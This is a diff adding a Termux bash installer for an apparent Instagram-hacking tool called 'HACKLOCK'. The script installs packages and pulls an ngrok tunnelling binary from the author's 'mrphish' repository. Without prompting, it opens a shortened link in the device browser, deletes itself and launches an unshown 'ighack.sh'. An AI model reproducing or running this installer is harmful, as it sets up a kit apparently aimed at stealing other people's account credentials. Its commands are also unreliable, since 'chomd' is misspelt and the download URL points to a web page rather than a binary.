@@ -1,0 +1,49 @@
+clear
+center() {
+  termwidth=$(stty size | cut -d" " -f2)
+  padding="$(printf '%0.1s' ={1..500})"
+  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
+}
+echo -e "\033[92m"
+center "HACKLOCK SETUP"
+cod="\033[0m"
+o="\033[91m"
+grn="\033[92m"
+blu="\033[34m"
+msf="6.0.27"
+mob=$(uname -o)
+arc=$(dpkg --print-architecture)
+str=$(du -hs)
+krn=$(uname -s)
+#ip=$(curl -s https://api.ipify.org)
+AVL=`df -h /storage/emulated | awk '{ print $4 }' | tail -1`
+echo -e "
+$grn$cod STORAGE=$o"$AVL"$grn
+$grn$cod ARCHITECTURE=$o"$arc"$grn
+$grn$cod OS=$o"$mob"$grn
+$grn$cod KERNEL=$o"$krn"$grn
+
+------------------------------------
+|$grn FOLLLOW:$cod github.com/noob-hackers $grn|$grn
+|$grn SUBSCRIBE:$cod Noob Hackers          $grn|$grn
+|$grn CHAT:$cod wa.me/+919113948054        $grn|$grn
+------------------------------------$grn
+"
+echo -e "\e[92mTHIS MAY TAKE SOME TIME PLEASE WAIT.....\e[0m"
+sleep 5.0
+echo -e "\033[92m"
+center "INSTALLING REQUIREED PACKAGES"
+echo -e "\e[34mPACKAGES BEING INSTALLED WAIT....\e[0m"
+cd $HOME
+apt install -y php openssh wget git curl python > /dev/null 2>&1
+curl -LO https://github.com/noob-hackers/mrphish/blob/master/core/ngrok > /dev/null 2>&1
+chomd +x ngrok > /dev/null 2>&1
+mv ngrok $HOME/hacklock
+echo -e "\e[34mPACKAGES INSTALLED SUCCESSFULLY....[\e[92m✓\e[34m]\e[0m"
+echo -e "\033[92m"
+center "STARTING HACKLOCK"
+echo -e "\e[34mBOOTING HACKLOCK....\e[0m"
+rm setup
+am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1 
+cd $HOME/hacklock
+bash ighack.sh
